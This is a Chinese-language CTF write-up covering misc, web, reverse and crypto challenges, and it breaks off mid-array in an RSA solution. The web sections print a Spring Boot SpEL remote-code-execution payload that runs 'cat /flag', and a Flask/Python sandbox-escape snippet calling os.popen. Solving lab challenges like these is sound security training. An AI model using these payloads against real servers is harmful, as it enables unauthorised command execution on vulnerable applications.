+<p>Word改颜色看到flag</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921038-2144662268.jpg" alt="img"></p>
+<p>解题收获：</p>
+<p>熟悉word套路</p>
+<h3 id="编码转换"><a href="#编码转换" class="headerlink" title="编码转换"></a>编码转换</h3><p><a href="https://en.wikipedia.org/wiki/Brainfuck">Brainfuck</a>编码，进行解码</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921034-1024865016.jpg" alt="img"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921173-1404001639.jpg" alt="img"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921009-1737006962.jpg" alt="img"></p>
+<p>拼接下就是flag</p>
+<p>解题收获：</p>
+<p>更熟悉brainfuck编码，提升信息搜索能力</p>
+<h3 id="coding-analyse"><a href="#coding-analyse" class="headerlink" title="coding_analyse"></a>coding_analyse</h3><p>多重解码</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005920950-466352582.jpg" alt="img"></p>
+<p>凯撒解码</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005920991-1618520807.jpg" alt="img"></p>
+<p>解题收获：</p>
+<p>清晰辨析base各类编码与凯撒密码</p>
+<h3 id="bluetooth"><a href="#bluetooth" class="headerlink" title="bluetooth"></a>bluetooth</h3><p>筛选蓝牙9上的UIH数据包</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921152-769029822.jpg" alt="img"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921146-1405401380.jpg" alt="img"></p>
+<p>使用tshark导出到123txt</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921000-228492241.jpg" alt="img"></p>
+<p>这里能组成压缩包</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921192-1779551118.jpg" alt="img"></p>
+<p>010保存到本地后解压</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921025-1069153129.jpg" alt="img"></p>
+<p>将二者进行10-16进制转换，异或得到flag</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921030-630454111.jpg" alt="img"></p>
+<p>解题收获：</p>
+<p>更熟悉压缩包文件头属性，解码语言能力，wireshark的流量分析及kali中tshrak对数据的导出命令的使用</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="input-data"><a href="#input-data" class="headerlink" title="input_data"></a>input_data</h3><p>御剑扫描到index.php</p>
+<p>根据提示进入&#x2F;.svn</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005920990-646530664.jpg" alt="img"></p>
+<p>目录下翻找到flag</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921151-851550303.jpg" alt="img"></p>
+<p>解题收获：</p>
+<p>信息检索</p>
+<h3 id="Admin"><a href="#Admin" class="headerlink" title="Admin"></a>Admin</h3><p>打开网站无80web服务，dirsearch扫描</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921142-1674694945.jpg" alt="img"></p>
+<p>各个界面都访问，发现明显spring boot漏洞</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921167-446902796.jpg" alt="img"></p>
+<p>根据文章参考写payload</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921273-194938118.jpg" alt="img"></p>
+<p>最终为获取flag</p>
+<p>&#x2F;admin;&#x2F;?path&#x3D;<strong>${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(“cat &#x2F;flag”).getInputStream()).next()}</strong>::.x</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921214-382870029.jpg" alt="img"></p>
+<p>解题收获：</p>
+<p>信息检索，目录扫描，spring boot远程代码执行，对已知漏洞熟练使用payload</p>
+<h3 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h3><p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921092-1596218055.jpg" alt="img">可以被’open(<strong>import</strong>(“os”).popen(“ls”).read())’等绕过</p>
+<p>用自动化的 Python 沙箱逃逸脚本</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921277-1578743136.jpg" alt="img"></p>
+<p>得到payload</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921189-1186011779.jpg" alt="img"></p>
+<p>解题收获：</p>
+<p>对flask题型增加新的理解，熟悉利用github已知脚本对框架进行利用</p>
+<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="ez-apk"><a href="#ez-apk" class="headerlink" title="ez_apk"></a>ez_apk</h3><p>使用jadx反编译</p>
+<p>定义了checkin方法</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921250-1326402765.jpg" alt="img"></p>
+<p>获取密钥key，拿到cipher</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921243-51224060.jpg" alt="img"></p>
+<p>计算出正确的cipher</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cipher = <span class="string">&#x27;f`vg\u007fvkXknxfznQv|gz|\u007f&#125;c|G~bh&#123;&#123;x|\u007fVVFGX&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(cipher)):</span><br><span class="line"></span><br><span class="line">  flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(cipher[i:i+<span class="number">1</span>]) ^ i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+<p>计算出flag</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">cipher_text, secret_key</span>):</span><br><span class="line"></span><br><span class="line">  key_bytes = []</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> char <span class="keyword">in</span> secret_key:</span><br><span class="line"></span><br><span class="line">​    key_bytes.append(<span class="built_in">ord</span>(char))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  decoded_chars = []</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> index, encrypted_char <span class="keyword">in</span> <span class="built_in">enumerate</span>(cipher_text):</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> encrypted_char <span class="keyword">in</span> [<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>]:</span><br><span class="line"></span><br><span class="line">​      decoded_chars.append(encrypted_char)</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">​      key_char = key_bytes[index % <span class="built_in">len</span>(key_bytes)] - <span class="number">97</span></span><br><span class="line"></span><br><span class="line">​      cipher_shift = <span class="built_in">ord</span>(encrypted_char) - <span class="number">97</span></span><br><span class="line"></span><br><span class="line">​      decoded_shift = (cipher_shift - key_char) % <span class="number">26</span></span><br><span class="line"></span><br><span class="line">​      decoded_char = <span class="built_in">chr</span>(decoded_shift + <span class="number">97</span>)</span><br><span class="line"></span><br><span class="line">​      decoded_chars.append(decoded_char)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decoded_chars)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">cipher_text = <span class="string">&quot;fatd&#123;**_cgrmvc_ylvhokhuk_gxsgffc_wtec&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">secret_key = <span class="string">&#x27;aptxcony&#x27;</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">decoded_string = decode(cipher_text, secret_key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag:&gt;&quot;</span>, decoded_string)</span><br></pre></td></tr></table></figure>
+
+<p>解题收获：</p>
+<p>反编译函数查找，代码分析及chatgpt利用更熟悉</p>
+<h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><p>密码长度检查</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921269-769154922.jpg" alt="img"></p>
+<p>最后一个字符必须为w</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921202-1289991758.jpg" alt="img"></p>
+<p>调用 check_password() 函数验证</p>
+<p>字符串用pow计算，推理</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921408-1287665569.jpg" alt="img"></p>
+<p>我们可以使用printf(“%d”,pow1 ((o———–o</p>
+<p>​             |      !</p>
+<p>​             !      !</p>
+<p>​             !      !</p>
+<p>​             o———–o).A,2)+(I—I))</p>
+<p>将密文输出，得到密文后进行Z3约束求解</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">a, b, c, d, e, f, g, h, i, j, k, l = Ints(<span class="string">&quot;a b c d e f g h i j k l&quot;</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">solver.add(a + b == <span class="number">101</span>) <span class="comment"># a + b == 101</span></span><br><span class="line"></span><br><span class="line">solver.add(b + c == <span class="number">143</span>) <span class="comment"># b + c == 143</span></span><br><span class="line"></span><br><span class="line">solver.add(a * c == <span class="number">5035</span>) <span class="comment"># a * c == 5035</span></span><br><span class="line"></span><br><span class="line">solver.add(d + f == <span class="number">163</span>) <span class="comment"># d + f == 163</span></span><br><span class="line"></span><br><span class="line">solver.add(d + e == <span class="number">226</span>) <span class="comment"># d + e == 226</span></span><br><span class="line"></span><br><span class="line">solver.add(e * f == <span class="number">5814</span>) <span class="comment"># e * f == 5814</span></span><br><span class="line"></span><br><span class="line">solver.add(h + i == <span class="number">205</span>) <span class="comment"># h + i == 205</span></span><br><span class="line"></span><br><span class="line">solver.add(g + i == <span class="number">173</span>) <span class="comment"># g + i == 173</span></span><br><span class="line"></span><br><span class="line">solver.add(g * h == <span class="number">9744</span>) <span class="comment"># g * h == 9744</span></span><br><span class="line"></span><br><span class="line">solver.add(j + k * l == <span class="number">5375</span>) <span class="comment"># j + k * l == 5375</span></span><br><span class="line"></span><br><span class="line">solver.add(k + j * l == <span class="number">4670</span>) <span class="comment"># k + j * l == 4670</span></span><br><span class="line"></span><br><span class="line">solver.add(j + k == <span class="number">205</span>) <span class="comment"># j + k == 205</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line"></span><br><span class="line">  model = solver.model()</span><br><span class="line"></span><br><span class="line">  result = [model[v].as_long() <span class="keyword">for</span> v <span class="keyword">in</span> [a, b, c, d, e, f, g, h, i, j, k, l]]</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> result))</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;no ans!&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>替换下位置flag就出了</p>
+<p>解题收获：</p>
+<p>简单的逻辑推理和代码审计，及Z3约束求解方法熟悉</p>
+<h3 id="机器猫"><a href="#机器猫" class="headerlink" title="机器猫"></a>机器猫</h3><p>我们使用pyinstxtractor反编译转回源代码.pyc</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921546-2124402375.jpg" alt="img"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921419-602456407.jpg" alt="img"></p>
+<p>在010查看到加密的base64</p>
+<p><img src="file:///C:/Users/Lenovo/AppData/Local/Temp/msohtmlclip1/01/clip_image058.jpg" alt="img"></p>
+<p>使用<a href="https://cyberchef.org/%E8%A7%A3%E5%AF%86%EF%BC%8C%E7%B1%BB%E4%BC%BC%E4%BA%8E%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81">https://cyberchef.org/解密，类似于凯撒密码</a></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921369-1590400038.jpg" alt="img"></p>
+<p>随波逐流</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921499-1278849294.jpg" alt="img"></p>
+<p>解题收获：</p>
+<p>对python代码反编译出原始pyc使用，010与密码学的熟练运用</p>
+<h3 id="CSMazeee"><a href="#CSMazeee" class="headerlink" title="CSMazeee"></a>CSMazeee</h3><p>去壳，用dnspy分析</p>
+<p>点击100次可以跳出button1_Click，</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921512-942113034.jpg" alt="img"></p>
+<p>每次输入字符会导致 num 发生增减变化，变化的步长是 1；num2 则每次按照步长为 14 进行加减。在处理这些输入字符的过程中，程序会不断计算 mazee[num + num2] 这个索引位置的值。校验规则是：如果 mazee[num + num2] 中的某个中间状态值为 48，则继续校验；当所有输入处理完毕时，mazee[num + num2] 的最终值必须为 49，校验才算通过。</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921485-1543842754.jpg" alt="img"></p>
+<p>十六进制下能看到0x30, 0x30, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x30, 0x30, 0x30, 0x30, 0x0A, 0x0A, 0x2A, 0x30,</p>
+<p>  0x30, 0x30, 0x30, 0x30, 0x30, 0x2A, 0x30, 0x2A, 0x2A, 0x30, 0x0A, 0x0A, 0x2A, 0x2A, 0x2A, 0x2A,</p>
+<p>  0x2A, 0x2A, 0x30, 0x2A, 0x30, 0x2A, 0x2A, 0x30, 0x0A, 0x0A, 0x2A, 0x2A, 0x31, 0x30, 0x30, 0x2A,</p>
+<p>  0x30, 0x30, 0x30, 0x2A, 0x2A, 0x30, 0x0A, 0x0A, 0x2A, 0x2A, 0x2A, 0x2A, 0x30, 0x2A, 0x2A, 0x2A,</p>
+<p>  0x2A, 0x2A, 0x2A, 0x30, 0x0A, 0x0A, 0x2A, 0x2A, 0x2A, 0x2A, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30,</p>
+<p>  0x30, 0x30, 0x0A, 0x0A</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921411-1787900803.jpg" alt="img"></p>
+<p>num + num2 在中间过程中必须保持在 INDEXES[] 中。</p>
+<p>经过所有字符输入后，num + num2 的最终值必须为 44。</p>
+<p>其中一个符合条件的路径为：rdrrrrrddrruuurrrdddddllllllluull</p>
+<p><img src="/C:/Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20241004010343076.png" alt="image-20241004010343076"></p>
+<p>解题收获：</p>
+<p>对dnspy反编译调试exe文件，断点分析程序的运用更熟练</p>
+<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="不小心"><a href="#不小心" class="headerlink" title="不小心"></a>不小心</h3><p>代码定义了一个字符串s，正则表达检查flag符合DASCTF{}格式，接着转换二进制字符串，补全为8位，将字符按照3字节与6字节分割转换，典型的换表base64类型</p>
+<p>将base64字符集输入，将已经编码的字符串C对应到索引，定义exp进行递归，n分割4个为1字符依次递归base64函数解码</p>
+<p>以下是exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"> \<span class="comment"># python 3.6</span></span><br><span class="line"></span><br><span class="line"> \<span class="comment"># import re</span></span><br><span class="line"></span><br><span class="line"> s = <span class="string">&quot;fst3Sem8Wgnobcd9+++++uv2JKpUViFGHz0QRMyjkA7NaBC14wXYxh5OP/DEqrZIl6LT&quot;</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">inputs</span>):</span><br><span class="line">   bin_str = [<span class="string">&#x27;&#123;:08b&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(i)) <span class="keyword">for</span> i <span class="keyword">in</span> inputs] </span><br><span class="line">   outputs = <span class="string">&quot;&quot;</span></span><br><span class="line">   nums = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">while</span> bin_str:</span><br><span class="line">     temp_list = bin_str[:<span class="number">3</span>]</span><br><span class="line">     <span class="keyword">if</span> <span class="built_in">len</span>(temp_list) != <span class="number">3</span>:</span><br><span class="line">       nums = <span class="number">3</span> - <span class="built_in">len</span>(temp_list) </span><br><span class="line">       temp_list += [<span class="string">&#x27;0&#x27;</span> * <span class="number">8</span>] * nums </span><br><span class="line">     temp_str = <span class="string">&#x27;&#x27;</span>.join(temp_list) </span><br><span class="line">     temp_str_list = [<span class="built_in">int</span>(temp_str[i * <span class="number">6</span>:(i + <span class="number">1</span>) * <span class="number">6</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> nums:</span><br><span class="line">   temp_str_list = temp_str_list[:<span class="number">4</span> - nums] </span><br><span class="line"></span><br><span class="line"> outputs += <span class="string">&#x27;&#x27;</span>.join(s[i] <span class="keyword">for</span> i <span class="keyword">in</span> temp_str_list) </span><br><span class="line"> bin_str = bin_str[<span class="number">3</span>:] </span><br><span class="line"></span><br><span class="line">   outputs += <span class="string">&#x27;=&#x27;</span> * nums </span><br><span class="line">   <span class="keyword">return</span> outputs</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">custom_decode</span>(<span class="params">encoded_string, s, a</span>):</span><br><span class="line">   result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">   <span class="keyword">for</span> char <span class="keyword">in</span> encoded_string:</span><br><span class="line">     <span class="keyword">if</span> char <span class="keyword">in</span> s:</span><br><span class="line">       index = s.index(char)</span><br><span class="line">       result += a[index] </span><br><span class="line">   <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> s = <span class="string">&quot;fst3Sem8Wgnobcd9+++++uv2JKpUViFGHz0QRMyjkA7NaBC14wXYxh5OP/DEqrZIl6LT&quot;</span></span><br><span class="line"> a = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span></span><br><span class="line"> b = <span class="string">&#x27;+Se++h+mF5u0d++Oc++RbQJYbyuMb++0cYuQc+SwdmK0d+fwcYRYG+&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> decoded_string = custom_decode(b, s, a)</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;Decoded to Base64:&quot;</span>, decoded_string)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">base64_recursive_decode</span>(<span class="params">chunk, idx, ss</span>):</span><br><span class="line">   <span class="keyword">if</span> idx &gt;= <span class="number">4</span>: </span><br><span class="line">     <span class="keyword">try</span>:</span><br><span class="line">       decoded_chunk = b64decode(chunk)</span><br><span class="line">     <span class="keyword">except</span> Exception:</span><br><span class="line">       <span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> <span class="built_in">all</span>(<span class="built_in">chr</span>(byte) <span class="keyword">in</span> ss <span class="keyword">for</span> byte <span class="keyword">in</span> decoded_chunk):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;Decoded chunk:&quot;</span>, decoded_chunk)</span><br><span class="line"> <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> chunk[idx] == <span class="string">&#x27;Q&#x27;</span>: </span><br><span class="line">     <span class="keyword">for</span> replacement <span class="keyword">in</span> <span class="string">&quot;QRSTU&quot;</span>:</span><br><span class="line">       new_chunk = chunk[:idx] + replacement + chunk[idx + <span class="number">1</span>:]</span><br><span class="line">       base64_recursive_decode(new_chunk, idx + <span class="number">1</span>, ss)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">     base64_recursive_decode(chunk, idx + <span class="number">1</span>, ss)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> ss = <span class="string">&#x27;0123456789abcdef-_&#123;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"> n = <span class="string">&#x27;QEFQQ1QGezc4YWQhMQEzZQcwOWZkZjEyYQVhYQQhYQVkZDYyZQMzfQ==&#x27;</span></span><br><span class="line"> n = n[<span class="number">8</span>:] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> v <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(n), <span class="number">4</span>):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;--------- Decoding block:&#x27;</span>, v, n[v: v + <span class="number">4</span>])</span><br><span class="line">   base64_recursive_decode(n[v:v + <span class="number">4</span>], <span class="number">0</span>, ss)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921535-1036607592.jpg" alt="img"></p>
+<p>解题收获：</p>
+<p>提高对变表base64的遍历能力编写</p>
+<h3 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h3><p>这就是个套娃</p>
+<p>Base100-base64-base85-base91-base62-再用随波逐流工具一键解码</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921441-1486957154.jpg" alt="img"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921560-391088823.jpg" alt="img"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921585-2046352629.jpg" alt="img"></p>
+<p>解题收获：</p>
+<p>对密码学编码形式更熟悉</p>
+<h3 id="easy-crypto1"><a href="#easy-crypto1" class="headerlink" title="easy_crypto1"></a>easy_crypto1</h3><p>找到下一个比 getPrime(16) \times p + 38219 更大的素数。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">n = <span class="number">1605247600724752598798254639224215706171506359654961357324428027985787942008103766562745464838961569081446916113769517713344420113584254259000172572811154232107339480903672251992191997458469905064423618888336088652352540882576826988355783159237971043770132628344798937353150930071309347972804118952814447576207066147031238749098842662046825743988208813903138796789940911515825517078554074496474819128789835309636804325132602557092847746454786387067599510769382078521691609970320528531270474091713477040343897269903489441410062592732302402854035415438078656688806905350495825334584533345448091335565792091890185673190424063</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">751639057610677013264061431434189083017589908118307247217007533938435229431015858783222167911772848893015518607229280589985711010766459396989232072512314594917029375221335361209036112742388866873824163350886610514973038316512032459352053158417705406031466332440378871927174731975794579894912999936641163063898365134788537389162378185448090279397717831977803284480743612393591614284972981435749362255654561121758163485884075260156288337176713756471879489767416836868661153693157792733142765671887792303181376620864506386820826866340907593080654521498766421056474652652337037121881207188033108746890998208582406826010121861</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> ** <span class="number">15</span>, <span class="number">2</span> ** <span class="number">16</span>):</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> isPrime(i): </span><br><span class="line"></span><br><span class="line">​    candidate_q = next_prime(i * gmpy2.iroot(n // i, <span class="number">2</span>)[<span class="number">0</span>] + <span class="number">38219</span>)</span><br><span class="line"></span><br><span class="line">​    </span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> n % candidate_q == <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">​      q = candidate_q</span><br><span class="line"></span><br><span class="line">​      <span class="built_in">print</span>(<span class="string">f&quot;Found q: <span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">​      <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">p = n // q</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">E1 = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decrypted message: <span class="subst">&#123;E1&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>中国剩余定理解出E2</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chinese_remainder_theorem</span>(<span class="params">moduli, remainders</span>):</span><br><span class="line"></span><br><span class="line">  total_sum = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  total_product = reduce(<span class="keyword">lambda</span> a, b: a * b, moduli) </span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> modulus, remainder <span class="keyword">in</span> <span class="built_in">zip</span>(moduli, remainders):</span><br><span class="line"></span><br><span class="line">​    partial_product = total_product // modulus </span><br><span class="line"></span><br><span class="line">​    total_sum += remainder * (gmpy2.invert(partial_product, modulus) * partial_product)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> total_sum % total_product </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">moduli_list = [</span><br><span class="line"></span><br><span class="line">  <span class="number">15863230586500684911356384742123404120213699052018048588650392009927565369685497256344682150189923131009586323640507773706997704860898682946308031020361302334248895233255911348365179153799197341744863134926804603973507415697810440916305092395180382239729550833607847524005391137474497849077097574452115379368463540087172800902210822143687014813631366360652583216269138116785489485772437870528892032119729929607857459621078790511144060710035933887337208301078892163837203412081114510143406013892393607932596921308889058909544584619676380766485493114814753878272881866907210235681877689493671668534251778397658670518117</span>,</span><br><span class="line"></span><br><span class="line">  <span class="number">14144098469438619358682652828507744381697293556670717685553585719665002440476256008471235313826051740009083510860714991201047915737216102220242621674841600987122005914542061963618272275986835928673920375768272390912778741502655909281390948606467847118377641357547931472588836726339758576038273820470879637555458446243401248151675266602656677360819563744765522495640821496694918515669243614141704744848980746101569785439728585144841655665959389460512628800782742764147773150430552859331269667626942993392101897661719871375721143240270211821269260950380944670195863016621594387236339317938305273510719419578308449465183</span>,</span><br><span class="line"></span><br><span class="line">  <span class="number">27563822879593503938377821960427219022565215631856333510782568496016547757945464794632272818101891677705256471714805217606503652132995136255720639088424576003650628211271025648183600635145895528466199068640094470078526413324708028578289949241288828542143203769199399500669311878391255837977932634772778594526940501234736059441483897017015324765266787399950699732518347518591167932031031320265136158304460199654008895095274754918153773566824931440342525688741289235153882699461549523425169846266597156773535163599640189457171272058311480951820887261040891344076039474315985825984444520336790670313179493074014037981261</span></span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">remainders_list = [</span><br><span class="line"></span><br><span class="line">  <span class="number">3833095607830862948079097323254872789586576953317671099752083261949616608759231291050566542764984974722790226120399722937104503590740358249900089784508490830379531632752169777949200718567033018577184658177019404903817920024468923715441355404672443007723525750768430895425376124679225715687382380114628103058312176343693900115638265002657622618744666247132114654135429040069316368839938881716554901593031901272992940200484460436193699175500376368456706998564064693820008778900344357745691652875500810447147088715289581351501876012044611990972521570253106671158207677490849249612002954497927762168699886110455354481924</span>,</span><br><span class="line"></span><br><span class="line">  <span class="number">1502420121177211156091634258259634977709023894278792755694473756163084431123774101512866316989917922052023168401167212284219907272528117024670443698990238243030221117004372456475521502350404137469088570170885409265567084376069256924135270283335242133163303599239181417949980292944203204296598188175632723968779672994090788585343302473442389865459398142634104331743517384589200789331489394375604801951994831647339839112698394141328178967516636452592385248135340133712522135715943787590172334743893259621909532456281362868290556461907936774231166936915669816509378419892149164552548131776979706381641477878931403040942</span>,</span><br><span class="line"></span><br><span class="line">  <span 